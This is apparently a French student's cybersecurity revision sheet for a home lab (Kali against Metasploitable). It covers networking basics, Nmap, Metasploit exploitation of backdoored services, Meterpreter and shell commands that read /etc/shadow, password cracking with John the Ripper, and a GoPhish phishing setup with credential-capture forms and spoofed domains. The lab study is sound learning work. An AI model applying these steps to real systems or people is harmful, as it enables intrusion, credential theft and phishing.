# 🔐 Fiche Cybersécurité — Zak Diallo
> Préparation alternance cybersécurité | Labo : Kali Linux + Metasploitable sur VirtualBox

---

## 📋 Sommaire
1. [Le Modèle OSI](#1-le-modèle-osi)
2. [TCP/IP et le Handshake](#2-tcpip-et-le-handshake)
3. [ARP](#3-arp)
4. [DNS](#4-dns)
5. [HTTP et HTTPS](#5-http-et-https)
6. [Wireshark](#6-wireshark)
7. [Nmap](#7-nmap)
8. [Metasploit](#8-metasploit)
9. [John the Ripper](#9-john-the-ripper)
10. [GoPhish et Phishing](#10-gophish-et-phishing)
11. [Commandes Linux essentielles](#11-commandes-linux-essentielles)

---

## 1. Le Modèle OSI

Le modèle OSI décrit les 7 étapes par lesquelles passent les données sur un réseau.

| Couche | Nom | Rôle | Exemple |
|--------|-----|------|---------|
| 7 | Application | Ce que l'utilisateur voit | HTTP, FTP, DNS |
| 6 | Présentation | Chiffrement, encodage | SSL/TLS |
| 5 | Session | Maintien des connexions | Cookies |
| 4 | Transport | Découpe les données, fiabilité | TCP, UDP |
| 3 | Réseau | Routage, adresses IP | IP, ICMP |
| 2 | Liaison | Adresses MAC, réseau local | Ethernet, ARP |
| 1 | Physique | Câbles, Wi-Fi, signaux | RJ45, Wi-Fi |

**Moyen mémo (7→1) :** "Ah Bien Sûr Tout Repose Là Physiquement"

### Paquets et Trames
- **Trame** (couche 2) = enveloppe contenant les **adresses MAC**
- **Paquet** (couche 3) = enveloppe contenant les **adresses IP**
- **Segment** (couche 4) = enveloppe contenant les ports et numéros Seq/Ack

### En cybersécurité
- Couche 7 : attaques web (SQL injection, XSS, phishing)
- Couche 6 : HTTPS mal configuré → données interceptables
- Couche 4 : scans Nmap, attaques DDoS
- Couche 3 : IP spoofing
- Couche 2 : ARP Poisoning (Man-in-the-Middle)

---

## 2. TCP/IP et le Handshake

### TCP vs UDP
| TCP | UDP |
|-----|-----|
| Fiable, ordonné | Rapide, sans garantie |
| Handshake 3 voies | Pas de connexion |
| HTTP, SSH, FTP | DNS, VoIP, streaming |

### Le Handshake TCP en 3 étapes
```
Client → Serveur : SYN      "Je veux me connecter"
Serveur → Client : SYN-ACK  "OK, tu m'entends ?"
Client → Serveur : ACK      "Oui, on commence !"
```

### Numéros Seq/Ack
- **Seq** = numéro de départ pour compter les octets envoyés
- **Ack** = confirmation de réception ("j'ai reçu jusqu'ici, envoie la suite")

### Flags TCP importants
- **SYN** = début de connexion
- **ACK** = accusé de réception
- **FIN** = fermeture propre
- **RST** = reset brutal (port fermé)

### En cybersécurité
- **RST** en réponse à un SYN = port fermé
- **SYN-ACK** en réponse à un SYN = port ouvert
- **Pas de réponse** = port filtré (pare-feu)
- C'est la base du **scan Nmap** !

---

## 3. ARP

**ARP (Address Resolution Protocol)** : trouve l'adresse MAC à partir d'une adresse IP.

### Fonctionnement
```
ARP Request : "Qui a l'IP 192.168.1.1 ? Répondez à 192.168.1.5"
ARP Reply   : "C'est moi ! Mon MAC est 52:55:0a:00:02:02"
```

### Commandes pratiques
```bash
arp -a                    # voir la table ARP locale
ping 10.0.2.2             # génère du trafic ARP
```

### Filtre Wireshark
```
arp
```

### ARP Poisoning (attaque)
L'attaquant envoie un faux ARP Reply pour se faire passer pour le routeur.
Résultat : tout le trafic passe par lui avant d'aller sur Internet (**Man-in-the-Middle**).

> ⚠️ Illégal sur un réseau qu'on ne possède pas.

---

## 4. DNS

**DNS (Domain Name System)** : traduit un nom de domaine en adresse IP.

### Fonctionnement
```
Tu tapes : google.com
DNS trouve : 172.217.22.78
Ta machine se connecte à cette IP
```

### Types d'enregistrements
| Type | Rôle |
|------|------|
| A | Nom → IP (IPv4) |
| AAAA | Nom → IP (IPv6) |
| MX | Serveurs mail du domaine |
| CNAME | Alias vers un autre domaine |
| TXT | Infos sécurité (SPF, DKIM) |

### Commandes pratiques
```bash
nslookup google.com              # trouver l'IP d'un domaine
nslookup -type=MX google.com     # trouver les serveurs mail
dig google.com ANY               # tous les enregistrements DNS
```

### Filtre Wireshark
```
dns
```

### En cybersécurité
- **Reconnaissance** : énumérer les sous-domaines (mail., vpn., admin.)
- **DNS Spoofing** : répondre avec une fausse IP pour rediriger la victime
- **Phishing** : l'enregistrement MX révèle quel serveur mail cibler

---

## 5. HTTP et HTTPS

### Différence clé
| HTTP | HTTPS |
|------|-------|
| Port 80 | Port 443 |
| Non chiffré | Chiffré (TLS) |
| Données lisibles dans Wireshark | Données illisibles |

### Méthodes HTTP
| Méthode | Rôle |
|---------|------|
| GET | Demander une page (données dans l'URL) |
| POST | Envoyer des données (mot de passe, formulaire) |
| PUT | Modifier une ressource |
| DELETE | Supprimer une ressource |

### Codes de réponse HTTP
| Code | Signification |
|------|--------------|
| 200 | OK — tout va bien |
| 301 | Redirection |
| 403 | Interdit — pas le droit |
| 404 | Page introuvable |
| 500 | Erreur serveur |

### Commandes pratiques
```bash
curl http://127.0.0.1              # requête HTTP basique
curl -v http://127.0.0.1           # voir tous les headers
curl -v https://google.com         # voir le TLS Handshake
```

### TLS Handshake (HTTPS)
```
Client Hello  → "Je veux chiffrer, voici mes algos"
Server Hello  → "OK, voici mon certificat"
Cert verify   → "Je vérifie ton certificat"
Finished      → "Connexion chiffrée établie !"
```

### Point important
> 🔴 HTTPS ne veut pas dire "site sécurisé" — ça veut dire "connexion chiffrée".
> Un site de phishing peut très bien avoir HTTPS !

---

## 6. Wireshark

**Wireshark** : outil de capture et d'analyse du trafic réseau en temps réel.

### Lancer Wireshark
```bash
sudo wireshark
```

### Filtres essentiels
```
tcp                          # uniquement le trafic TCP
arp                          # uniquement le trafic ARP
dns                          # uniquement le trafic DNS
http                         # uniquement le trafic HTTP
tcp.flags.syn == 1           # paquets SYN (début de connexion)
tcp.flags.syn == 1 and tcp.flags.ack == 0   # uniquement les SYN
tcp.flags.fin == 1           # paquets FIN (fermeture)
tcp.flags.reset == 1         # paquets RST (reset)
tcp.port == 443              # trafic HTTPS
ip.addr == 192.168.56.102    # filtrer par IP
```

### Lire un paquet
En bas de Wireshark quand tu cliques sur un paquet :
```
Frame           → Trame entière (couche 2)
Ethernet II     → Adresses MAC source et destination
Internet Protocol → Adresses IP source et destination
TCP/UDP         → Ports, flags, Seq/Ack
HTTP/TLS/DNS    → Données applicatives
```

---

## 7. Nmap

**Nmap** : outil de scan réseau pour découvrir les hôtes et services ouverts.

### Commandes essentielles
```bash
nmap 127.0.0.1                    # scan basique (1000 ports)
nmap -sV 127.0.0.1                # détecter les versions des services
nmap -sS 127.0.0.1                # SYN scan (plus discret)
nmap -O 127.0.0.1                 # détecter l'OS
nmap -p 80,443,22 127.0.0.1       # scanner des ports précis
nmap -p- 127.0.0.1                # scanner les 65535 ports
nmap -sV -O -p- 192.168.56.102    # scan complet
nmap -sn 192.168.56.0/24          # découvrir les hôtes actifs
nmap -sV 192.168.56.102 -oN resultat.txt  # sauvegarder les résultats
```

### Interpréter les résultats
```
PORT     STATE   SERVICE    VERSION
80/tcp   open    http       Apache httpd 2.4.66
22/tcp   open    ssh        OpenSSH 4.7p1
443/tcp  closed  https      → RST reçu
8080/tcp filtered http      → pas de réponse (pare-feu)
```

### États des ports
| État | Signification |
|------|--------------|
| open | Port ouvert, service actif |
| closed | Port fermé, RST reçu |
| filtered | Pas de réponse, pare-feu |

### Services/Ports à retenir
| Port | Service | Remarque |
|------|---------|----------|
| 21 | FTP | Transfert fichiers, souvent vulnérable |
| 22 | SSH | Accès distant sécurisé |
| 23 | Telnet | Accès distant NON chiffré |
| 25 | SMTP | Emails |
| 53 | DNS | Résolution de noms |
| 80 | HTTP | Web non chiffré |
| 443 | HTTPS | Web chiffré |
| 445 | SMB | Partage Windows (EternalBlue) |
| 3306 | MySQL | Base de données |
| 3389 | RDP | Bureau à distance Windows |

---

## 8. Metasploit

**Metasploit** : boîte à outils contenant des centaines d'exploits prêts à l'emploi.

### Lancer Metasploit
```bash
msfconsole
```

### Workflow complet
```bash
search vsftpd                     # chercher un exploit
use 1                             # sélectionner l'exploit
show options                      # voir les options à configurer
set RHOSTS 192.168.56.102         # IP de la cible
set LHOST 192.168.56.101          # IP de ta machine (pour reverse shell)
run                               # lancer l'exploit
```

### Dans Meterpreter
```bash
sysinfo          # infos sur le système compromis
getuid           # quel utilisateur tu es
hashdump         # extraire les mots de passe (Windows)
shell            # ouvrir un terminal sur la cible
download /etc/shadow .   # télécharger un fichier
ps               # voir les processus
```

### Dans le shell Linux (après shell)
```bash
whoami                    # confirmer qu'on est root
id                        # voir les droits
cat /etc/passwd           # liste des utilisateurs
cat /etc/shadow           # mots de passe hashés
ls /home                  # dossiers des utilisateurs
find / -perm -4000 2>/dev/null   # fichiers SUID (escalade)
```

### Exploits pratiqués
| Service | Port | Exploit Metasploit | Résultat |
|---------|------|--------------------|---------|
| vsftpd 2.3.4 | 21 | exploit/unix/ftp/vsftpd_234_backdoor | Shell root |
| UnrealIRCd | 6667 | exploit/unix/irc/unreal_ircd_3281_backdoor | Shell root |
| Backdoor directe | 1524 | nc 192.168.56.102 1524 | Shell root immédiat |

### Types de shells
| Type | Description |
|------|-------------|
| Shell normal | Toi tu te connectes à la cible |
| Reverse shell | La cible se connecte à toi |

### Rangs des exploits
| Rang | Fiabilité |
|------|-----------|
| excellent | Fonctionne à coup sûr |
| great | Très fiable |
| good | Fiable dans la plupart des cas |
| normal | Peut avoir des ratés |

---

## 9. John the Ripper

**John the Ripper** : outil de crackage de mots de passe hashés.

### Fonctionnement
John essaie chaque mot de la wordlist, le hashe, et compare au hash cible.

### Commandes
```bash
# Cracker avec une wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt shadow

# Voir les résultats
john --show shadow

# Décompresser rockyou.txt si nécessaire
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

### Récupérer le fichier shadow
```bash
# Dans Meterpreter
download /etc/shadow .

# Ou directement dans le shell
cat /etc/shadow
```

### Résultats obtenus sur Metasploitable
```
123456789  →  klog     (cracké en secondes)
batman     →  sys      (cracké en secondes)
service    →  service  (cracké en secondes)
```

### Leçon importante
> Un mot de passe simple est cracké en secondes.
> Un mot de passe complexe (long + majuscules + chiffres + symboles) peut prendre des années.

### Fichiers Linux importants
| Fichier | Contenu |
|---------|---------|
| /etc/passwd | Liste des utilisateurs |
| /etc/shadow | Mots de passe hashés (root seulement) |
| /etc/hosts | DNS local |
| /home | Dossiers personnels |
| /var/log | Logs système |
| /root | Dossier du compte root |

---

## 10. GoPhish et Phishing

**GoPhish** : outil open source pour simuler des campagnes de phishing de façon éthique.

### Types de phishing
| Type | Description |
|------|-------------|
| Phishing classique | Email en masse, peu ciblé |
| Spear Phishing | Email ciblé avec infos personnelles — le plus dangereux |
| Smishing | Phishing par SMS |
| Vishing | Phishing vocal (téléphone) |

### Étapes d'une attaque phishing
```
1. Reconnaissance  → collecter emails, noms, infos LinkedIn
2. Fausse page     → cloner un vrai site (banque, Google...)
3. Email piégé     → envoyer avec lien vers la fausse page
4. Victime clique  → arrive sur la fausse page
5. Vol des données → identifiants capturés en temps réel
```

### Lancer GoPhish
```bash
sudo gophish
# Interface web : https://127.0.0.1:3333
# Login : admin / [mot de passe généré au démarrage]
```

### Workflow GoPhish
```
1. Landing Page    → créer la fausse page de login
2. Email Template  → créer le faux email avec {{.URL}}
3. Users & Groups  → ajouter les cibles
4. Sending Profile → configurer le serveur SMTP
5. Campaign        → lancer la campagne
```

### Configuration Gmail SMTP
```
Host     : smtp.gmail.com:587
Username : ton.email@gmail.com
Password : [mot de passe d'application Google — sans espaces]
Use TLS  : ✅
```

### Métriques GoPhish
| Métrique | Signification |
|----------|--------------|
| Email Sent | Email envoyé |
| Email Opened | Email ouvert |
| Clicked Link | Lien cliqué |
| Submitted Data | Identifiants soumis |
| Email Reported | Email signalé comme phishing |

### HTML de la landing page (capture d'identifiants)
```html
<input type="text" name="username" placeholder="Email">
<input type="password" name="password" placeholder="Mot de passe">
```
> ⚠️ Les attributs `name="username"` et `name="password"` sont obligatoires pour que GoPhish capture les données !

### Techniques de spoofing
| Technique | Exemple |
|-----------|---------|
| Typosquatting | googlee.com |
| Homographe | googIe.com (I au lieu de l) |
| Sous-domaine | google.com.fakesite.com |

> 🔴 GoPhish et le phishing sont réservés à des tests autorisés uniquement. Toujours avoir une autorisation écrite avant toute campagne en entreprise.

---

## 11. Commandes Linux essentielles

### Navigation
```bash
ls -la          # lister avec détails et fichiers cachés
cd /etc         # aller dans un dossier
pwd             # afficher le dossier courant
cat /etc/passwd # afficher un fichier
```

### Permissions
```bash
chmod +x script.sh      # rendre exécutable
chmod 600 fichier       # lecture/écriture propriétaire seulement
sudo commande           # exécuter en admin
sudo -l                 # voir ce qu'on peut faire en sudo
```

### Recherche
```bash
grep "mot" fichier          # chercher du texte
grep -r "password" /var/www/ # chercher dans un dossier
find / -name "*.conf" 2>/dev/null   # trouver des fichiers
find / -perm -4000 2>/dev/null      # fichiers SUID
```

### Processus et réseau
```bash
ps aux                  # voir tous les processus
ps aux | grep apache    # filtrer les processus
ss -tulnp               # ports ouverts et services
ip a                    # voir les interfaces réseau
```

### Services
```bash
sudo service apache2 start   # démarrer Apache
sudo service apache2 stop    # arrêter Apache
sudo service apache2 status  # état du service
sudo service ssh start       # démarrer SSH
```

---

## 🎯 Récapitulatif du labo

### Configuration
```
Kali Linux       : 192.168.56.101 (attaquant)
Metasploitable   : 192.168.56.102 (cible)
Réseau           : Host-Only VirtualBox
```

### Workflow pentest complet
```
1. nmap -sV 192.168.56.102      → reconnaissance
2. msfconsole                    → lancer Metasploit
3. search [service]              → trouver l'exploit
4. use [numéro]                  → sélectionner
5. set RHOSTS / set LHOST        → configurer
6. run                           → exploiter
7. shell                         → terminal sur la cible
8. cat /etc/shadow               → récupérer les hashs
9. john --wordlist=rockyou.txt shadow → cracker
```

---

*Fiche créée dans le cadre de la préparation à une alternance en cybersécurité.*
*Outils utilisés : Kali Linux, VirtualBox, Wireshark, Nmap, Metasploit, John the Ripper, GoPhish*
